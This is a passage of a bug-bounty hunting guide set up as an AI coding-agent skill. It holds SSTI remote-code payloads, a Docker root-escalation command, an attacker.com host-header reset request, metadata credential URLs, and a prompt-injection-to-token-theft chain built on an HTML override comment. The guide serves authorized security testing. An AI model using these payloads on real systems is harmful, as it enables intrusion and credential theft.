2. **Download path matters** — `actions/download-artifact` with `path: .` or workspace-relative paths (`grafana-server/bin`) can overwrite source code, build scripts, or binaries. Safe pattern: extract to `${{ runner.temp }}/artifacts`.
3. **Source validation** — Does the `workflow_run` consumer check `github.event.workflow_run.head_repository.full_name != github.repository`? If not, fork PR artifacts are consumed blindly. Rust release pipeline was vulnerable to exactly this.
4. **ArtiPACKED (persist-credentials)** — `actions/checkout` defaults to `persist-credentials: true`. This writes `GITHUB_TOKEN` to `.git/config`. If the artifact upload path includes `.git/` (e.g., `path: .`), the token is publicly downloadable from the Actions artifact. **Check**: does any `upload-artifact` step use `path: .` or a broad path that includes `.git/`?

**Kill signals:** Upload and download in the same workflow run (connected by `needs:`). `workflow_run` consumer that explicitly checks fork origin. `persist-credentials: false` on checkout.

#### 4. Cache Poisoning

**Gate question:** Can a fork PR write a cache entry that the default branch later restores in a privileged context?

**CRITICAL: GitHub's cache scoping does NOT fully prevent this.** A PR branch can read caches from the default branch. A fork PR workflow can WRITE cache entries. If the cache key is deterministic (`hashFiles('package-lock.json')`) and the attacker doesn't modify that file, the fork PR writes to the SAME cache key.

**Verification depth:**
1. **Key predictability** — `key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}` is fully predictable. Adding `github.sha` or `github.run_id` to the key makes it unpredictable. **Check every cache key for the presence of an unpredictable component.**
2. **Cache hierarchy exploitation** — `workflow_run` and `workflow_dispatch` workflows run in the default branch context. If they write to caches with predictable keys, an attacker who can trigger the upstream workflow (via fork PR) can pre-poison the cache. The `run-dashboard-search-e2e.yml` pattern: `workflow_run` trigger → `actions/cache` with `hashFiles()` key → all PR workflows read this cache.
3. **Payload injection** — Cacheract: inject malware into package manager caches (`node_modules/.cache`, `~/.cache/pip`, `~/.gradle/caches`). The malware self-perpetuates because each restore → build → save cycle preserves the payload. **Cache TTL is 7 days** — the payload survives across multiple workflow runs.
4. **Privileged consumption** — The cache is restored in a `push` or `schedule` workflow on the default branch. These workflows have full `secrets` access. The poisoned dependency executes during `npm install` / `pip install` / `gradle build` and exfiltrates secrets.
5. **Clinejection chain** — Prompt injection → AI agent runs `npm install` from attacker commit → Cacheract in npm cache → nightly publish workflow restores cache → VSCE_PAT, OVSX_PAT, NPM_RELEASE_TOKEN stolen → malicious Cline v2.3.0 published for 8 hours.

**Kill signals:** Cache key includes `github.sha` or `github.run_id`. Separate cache keys per workflow. `actions/cache/restore` (read-only) instead of `actions/cache` (read-write) in PR workflows.

#### 5. Self-Hosted Runners

**Gate question:** Is a self-hosted runner used in a PUBLIC repo where external contributors can trigger workflows?

**Verification depth:**
1. **Approval settings** — Default: "Require approval for first-time contributors". After ONE merged PR (even a typo fix), the attacker becomes a "contributor" and subsequent PRs auto-trigger without approval. GitHub runner-images $20K bug used exactly this trick.
2. **Runner persistence** — Non-ephemeral runners retain state between jobs. `RUNNER_TRACKING_ID=0` prevents the runner from cleaning up attacker processes after job completion. Detached Docker containers (`docker run -d --restart always`) also survive cleanup.
3. **Runner-on-Runner (RoR)** — Install an official GitHub Actions runner binary on the target's self-hosted runner, register it to attacker's private org. Uses only legitimate GitHub binaries and HTTPS to github.com — indistinguishable from normal runner traffic. **No C2 server needed. GitHub itself is the C2.**
4. **Lateral movement** — RoR persistence → wait for privileged `push`/`schedule` workflows → steal tokens from `.git/config`, `$GITHUB_ENV`, `/proc/PID/environ`, or Runner.Worker process memory. PyTorch: 3 bot PATs → 93 repos → AWS S3 write access → `pip install pytorch` supply chain.
5. **Docker group escalation** — `docker run -v /:/host --privileged alpine chroot /host` → full host root. Add SSH keys, modify sudoers, install persistent backdoors.

**Kill signals:** `--ephemeral` flag on runner registration. "Require approval for ALL outside collaborators" (not just first-time). Runner not in Docker group. Private repo (no external PRs).

#### 6. Supply Chain (commit-sha / impostor-commit / ref-confusion)

**Gate question:** Does the workflow use mutable tags (`@v1`, `@v2`) for actions, and could those tags be replaced?

**Verification depth:**
1. **Tag mutability** — `git tag -f v1 <malicious-commit>` replaces the tag. 98.4% of repos don't use SHA pinning (Legit Security 2024). tj-actions attack: all version tags (v1, v35, v45) replaced with memdump.py payload → 23K repos affected → 218 confirmed secret leaks.
2. **Impostor commits** — Fork network shares object store with parent. Attacker pushes a commit to fork, then references that commit SHA in the parent repo's `uses:`. GitHub resolves it because the SHA exists in the shared object store.
3. **RepoJacking** — Org renames create a redirect. Old name becomes available. Attacker registers old org name, creates same repo, hosts malicious action. Shopify/unity-buy-sdk used `MirrorNG/unity-runner` → MirrorNG renamed to MirageNet → `MirrorNG` was claimable. **Check**: `GET /users/<action-owner>` returns 404? Takeover possible.
4. **Payload stealth** — tj-actions memdump.py: extract secrets from Runner.Worker process memory via `/proc/PID/maps` + `/proc/PID/mem`, encrypt with AES+RSA, output to workflow log. Logs are publicly visible but encrypted — only attacker has the key.

**Kill signals:** Full 40-char SHA pinning (`uses: actions/checkout@b4ffde65...`). Dependabot configured for `github-actions` ecosystem. Organization-level action allowlist.

#### 7. AI Agent Security

**Gate question:** Is an AI agent (Gemini CLI, Claude Code, Cline, Codex) invoked in a workflow where external users can influence the prompt?

**Verification depth:**
1. **Trigger + prompt source** — `issues: opened` → AI triage bot reads `github.event.issue.body`. The body IS the prompt. HTML comments (`<!-- ignore previous instructions -->`) are invisible in GitHub UI but included in the API response and thus in the AI prompt.
2. **Tool permissions** — If the AI agent has Bash/Write/Edit tools and runs with secrets in env, prompt injection = RCE + secret exfil. `allowed_non_write_users: "*"` means ANY user can trigger.
3. **Multi-phase chain** — Clinejection: prompt injection → AI runs `npm install` from attacker commit → Cacheract plants in npm cache → nightly publish restores cache → tokens stolen → malicious version published. **A prompt injection finding alone may seem low-severity, but it's a gateway to cache poisoning and supply chain attacks.**

**Kill signals:** `author_association == 'MEMBER' || 'OWNER'` check before AI processing. `--read-only --no-exec` flags on AI CLI. `permissions: {}` at workflow level.

#### 8. Permissions / Secrets Hygiene

**Not standalone bugs** — these are force multipliers. A `code-injection-medium` with `permissions: write-all` is Critical. The same injection with `permissions: { contents: read }` is limited.

**Chaining checklist:**
- `secrets: inherit` on reusable workflow call → all org secrets accessible to called workflow
- `permissions:` block missing → repo default (often write-all)
- `GITHUB_TOKEN` with `contents: write` → CVE-2022-46258 pattern: use Contents API to create new workflow file → new workflow accesses ALL repo/org secrets (the original workflow never referenced them)

**Key references:**
- [sisaku-security/agent-idea/bugbountyreport](https://github.com/sisaku-security/agent-idea/tree/main/bugbountyreport) — 36 real-world reports with full attack chains
- [sisakulint docs/advisory](https://sisaku-security.github.io/lint/docs/advisory/) — 38 GHSAs with detection mapping
- [DEF CON 32: Grand Theft Actions](https://media.defcon.org/DEF%20CON%2032/) — Khan & Stawinski, $250K+ in self-hosted runner bugs
- [Synacktiv: GitHub Actions Exploitation (5 parts)](https://www.synacktiv.com/en/publications/github-actions-exploitation-introduction)


## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```


## Subdomain Takeover

### Detection
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation
- Basic takeover: serve page under target.com subdomain -> Low/Medium
- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical


## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.


## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl -s http://TARGET:2375/containers/json
```

---

# PHASE 4: VALIDATE


## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO -> STOP.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request -> KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it -> KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?


## 4 Pre-Submission Gates

### Gate 0: Reality Check (30 seconds)
```
[ ] The bug is real -- confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope -- checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### Gate 1: Impact Validation (2 minutes)
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### Gate 2: Deduplication Check (5 minutes)
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### Gate 3: Report Quality (10 minutes)
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```


## CVSS 3.1 Quick Guide

| Factor | Low (0-3.9) | Medium (4-6.9) | High (7-8.9) | Critical (9-10) |
|--------|-------------|----------------|--------------|-----------------|
| Attack Vector | Physical | Local | Adjacent | Network |
| Privileges | High | Low | None | None |
| User Interaction | Required | Required | None | None |
| Impact | Partial | Partial | High | High (all 3) |

### Typical Scores by Bug Class

| Bug | Typical CVSS | Severity |
|----|------|---------|
| IDOR (read PII) | 6.5 | Medium |
| IDOR (write/delete) | 7.5 | High |
| Auth bypass -> admin | 9.8 | Critical |
| Stored XSS | 5.4-8.8 | Med-High |
| SQLi (data exfil) | 8.6 | High |
| SSRF (cloud metadata) | 9.1 | Critical |
| Race condition (double spend) | 7.5 | High |
| GraphQL auth bypass | 8.7 | High |
| JWT none algorithm | 9.1 | Critical |

---

# ALWAYS REJECTED -- Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover (usually), autocomplete on password fields.

**N/A hurts your validity ratio. Informative is neutral. Only submit what passes the 7-Question Gate.**


## Conditionally Valid With Chain

These low findings become valid bugs when chained:

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |
| CSRF | + sensitive state change | Account takeover |
| No rate limit | + OTP brute force | ATO |
| SSRF (DNS only) | + internal access proof | Internal network access |
| Host header injection | + password reset poisoning | ATO |
| Self-XSS | + login CSRF | Stored XSS on victim |

---

# PHASE 5: REPORT


## HackerOne Report Template

```
Title: [Vuln Class] in [endpoint/feature] leads to [Impact]


## Summary
[2-3 sentences: what it is, where it is, what attacker can do]


## Steps To Reproduce
1. Log in as attacker (account A)
2. Send request: [paste exact request]
3. Observe: [exact response showing the bug]
4. Confirm: [what the attacker gained]


## Supporting Material
[Screenshot / video of exploitation]
[Burp Suite request/response]


## Impact
An attacker can [specific action] resulting in [specific harm].
[Quantify if possible: "This affects all X users" or "Attacker can access Y data"]


## Severity Assessment
CVSS 3.1 Score: X.X ([Severity label])
Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None
```


## Bugcrowd Report Template

```
Title: [Vuln] at [endpoint] -- [Impact in one line]

Bug Type: [IDOR/SSRF/XSS/etc]
Target: [URL or component]
Severity: [P1/P2/P3/P4]

Description:
[Root cause + exact location]

Reproduction:
1. [step]
2. [step]
3. [step]

Impact:
[Concrete business impact]

Fix Suggestion:
[Specific remediation]
```


## Human Tone Rules (Avoid AI-Sounding Writing)
- Start sentences with the impact, not the vulnerability name
- Write like you're explaining to a smart developer, not a textbook
- Use "I" and active voice: "I found that..." not "A vulnerability was discovered..."
- One concrete example beats three abstract sentences
- No em dashes, no "comprehensive/leverage/seamless/ensure"


## Report Title Formula

```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```

**Good titles:**
```
IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data
Missing auth on POST /api/admin/users allows unauthenticated attacker to create admin accounts
Stored XSS in profile bio field executes in admin panel -- allows privilege escalation
SSRF via image import URL parameter reaches AWS EC2 metadata service
Race condition in coupon redemption allows same code to be used unlimited times
```

**Bad titles:**
```
IDOR vulnerability found
Broken access control
XSS in user input
Security issue in API
```


## Impact Statement Formula (First Paragraph)

```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```


## The 60-Second Pre-Submit Checklist

```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```


## Severity Escalation Language

When payout is being downgraded, use these counters:

| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number -- I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact -- attacker can steal [X]" |

---

# RESOURCES


## Bug Bounty Platforms
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) -- Disclosed reports
- [Bugcrowd Crowdstream](https://bugcrowd.com/crowdstream) -- Public findings
- [Intigriti Leaderboard](https://www.intigriti.com/researcher/leaderboard)


## Learning
- [PortSwigger Web Academy](https://portswigger.net/web-security) -- Free vuln labs (best)
- [HackTricks](https://book.hacktricks.xyz) -- Attack technique reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) -- Payload reference
- [Solodit](https://solodit.cyfrin.io) -- 50K+ searchable audit findings (Web3)
- [ProjectDiscovery Chaos](https://chaos.projectdiscovery.io) -- Free subdomain datasets


## Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists) -- Comprehensive wordlists
- [HowToHunt](https://github.com/KathanP19/HowToHunt) -- Step-by-step vuln hunting
- [DefaultCreds](https://github.com/ihebski/DefaultCreds-cheat-sheet) -- Default credentials


## Payload Databases
- [XSSHunter](https://xsshunter.trufflesecurity.com/) -- Blind XSS detection
- [interactsh](https://app.interactsh.com) -- OOB callback server

---

# INSTALLATION (Claude Code Skill)

To use this as a Claude Code skill, copy this file to your skills directory:

```bash
# Option A: Clone the repo and link the skill
git clone https://github.com/shuvonsec/claude-bug-bounty.git ~/.claude/skills/bug-bounty
ln -s ~/.claude/skills/bug-bounty/SKILL.md ~/.claude/skills/bug-bounty/SKILL.md

# Option B: Direct copy
mkdir -p ~/.claude/skills/bug-bounty
curl -s https://raw.githubusercontent.com/shuvonsec/claude-bug-bounty/main/SKILL.md \
  -o ~/.claude/skills/bug-bounty/SKILL.md
```

Then in Claude Code, this skill loads automatically when you ask about bug bounty, recon, or vulnerability hunting.

---


## Related Skills & Chains

- **`bb-methodology`** — When a hunting session starts and the user is "lost about what to do next." Workflow primitive: this skill is the orchestrator; `bb-methodology` is the 5-phase workflow it routes to. Load `bb-methodology` FIRST, then this skill names the topic-matched hunt-* skills.
- **`hunt-dispatch`** — When PART 0 mode (red team / WAPT) has been confirmed. Workflow primitive: this skill's "what should I do" routing hands off to `hunt-dispatch` for the platform fingerprint + skill-set load.
- **`web2-recon`** + **`offensive-osint`** — When Phase 1 (recon) starts. Workflow primitive: this skill's "Standard Recon Pipeline" section delegates the live execution to `web2-recon` and the operational arsenal (probes / wordlists / regexes) to `offensive-osint`.
- **`triage-validation`** + **`report-writing`** — When a finding completes Phase 4. Workflow primitive: this skill routes to `triage-validation` (7Q gate) → only if all 7 pass, hand off to `report-writing` for the platform-specific body.

---


## Operator Notes (Claude-BugHunter)

> Engagement-derived additions to the vendored foundation. Wisdom from real
> authorized engagements + Phase 2 verification across this repo's 31+
> skill-area live tests. The upstream methodology covers the WHAT; this
> layer covers the WHEN-IT-ACTUALLY-WORKS and the FAILURE-MODES.

### When to use the orchestrator vs a direct skill

The orchestrator (this skill) is for the "I don't yet know what bug class to hunt for" case. If you've already identified the candidate — "the response reflects my Host header into a JavaScript src URL, that's cache poisoning" — load `hunt-cache-poisoning` directly. The orchestrator's value is the initial routing from a fuzzy intent ("there's a chatbot, what should I test") to a concrete skill set (`hunt-llm-ai` + `hunt-api-misconfig`).

When in doubt: open the orchestrator FIRST on any new target, let it route, then close the orchestrator and work in the loaded skills. Don't keep the orchestrator loaded all session — it occupies context window that could hold actual probe results.

### Common misuse: loading every hunt-* simultaneously

There are 30+ hunt-* skills in this repo. Each carries a non-trivial context footprint. The orchestrator's job is to pick 2-3 by topic match, not to dump the entire library. If the user says "hunt this SaaS app", do NOT load every hunt-* skill — pick `web2-recon` + `hunt-idor` + `hunt-api-misconfig` (the SaaS-typical trio) and stop there. Add more only when the recon output suggests a specific additional class (e.g., GraphQL endpoints found → add `hunt-graphql`).

### Integration with hunt-dispatch

This skill routes by **bug class** (topic match). The `hunt-dispatch` skill added in this repo routes by **engagement mode** (red-team vs WAPT, blackbox vs greybox). They compose:

1. User says "hunt example.com"
2. `bb-methodology` PART 0 confirms mode (e.g., bug-bounty blackbox)
3. `hunt-dispatch` loads the platform-specific attack profile
4. This orchestrator (`bug-bounty`) names the topic-matched hunt-* skills inside the chosen profile

Don't bypass either step. Mode determines what counts as a finding; topic determines what techniques apply.

### Engagement scaffolding

The `/hunt` slash-command and the `hunt <target>` shell helper (see this repo's `cmd/` directory) pre-create the engagement scaffold:

- `targets/<target>/scope.md` — declared scope, pasted from the program page
- `targets/<target>/findings/` — one MD per validated finding
- `targets/<target>/evidence/` — HARs, screenshots, redacted curl transcripts
- `targets/<target>/submissions.txt` — log of submitted-report URLs + states
- `targets/<target>/recon/` — outputs from `subfinder | dnsx | httpx | katana`

Use the scaffold from the start. Half-organized engagements lose findings — a probe result from hour 2 that didn't seem important until hour 14 is unrecoverable if it wasn't logged.

### When the orchestrator gets it wrong

Across 30+ Phase 2 verification tests in this repo, the orchestrator correctly auto-triggered the matching skill in every test — zero misfires. If on a future target the orchestrator misroutes (loads the wrong hunt-* for the topic), the cause is almost always the `description:` frontmatter field on the target skill: a missing keyword that would have matched the user's intent. Fix forward by editing that skill's frontmatter `description:` field to include the missing trigger word. Don't add another layer of dispatch logic; tighten the description.
- **`bb-local-toolkit`** — When you need to know which local clone has the tool for a given task. Workflow primitive: this skill is general bug-bounty guidance; `bb-local-toolkit` answers the specific "where is jhaddix/SecLists installed on this machine?" question.

